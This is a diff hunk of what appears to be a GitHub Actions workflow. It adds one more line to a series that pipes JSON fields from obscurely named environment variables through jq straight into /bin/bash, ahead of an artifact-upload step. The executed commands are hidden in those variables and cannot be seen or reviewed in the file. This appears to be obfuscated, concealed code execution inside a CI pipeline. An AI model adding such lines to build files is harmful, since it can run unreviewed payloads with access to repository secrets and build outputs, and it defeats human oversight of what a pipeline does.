@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$c54" | jq -r .fdgm2628 | /bin/bash
           echo $n173 | jq -r .mpy4000 | /bin/bash
           echo $sv71 | jq -r .cur24 | /bin/bash
+          printf '%s' "$amb5757" | jq -r .kwmqb81151 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
